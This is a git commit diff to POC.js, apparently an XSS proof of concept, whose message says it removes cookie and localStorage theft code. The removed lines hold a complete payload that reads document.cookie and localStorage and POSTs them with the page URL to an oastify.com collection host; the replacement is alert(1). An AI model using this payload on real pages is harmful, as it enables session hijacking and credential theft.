9ff4c841428cdec9e13883fd837c59cc9303a118
hamza lachgar <121760220+am7maaz@users.noreply.github.com>
2026-02-07 19:31:14 +0100

    Eliminate cookie and localStorage theft code
    Removed code that steals cookies and localStorage tokens.

--- POC.js
+++ POC.js
@@ -1,14 +1,1 @@
-var cookies = document.cookie;
-
-// Steal localStorage tokens
-var tokens = JSON.stringify(localStorage);
-
-// Send to attacker's server
-fetch('https://b1dwxjqy1aa18kejojhf4d4lnct3ht5i.oastify.com/steal', {
-    method: 'POST',
-    body: JSON.stringify({
-        cookies: cookies,
-        localStorage: tokens,
-        url: window.location.href
-    })
-});
+alert(1);
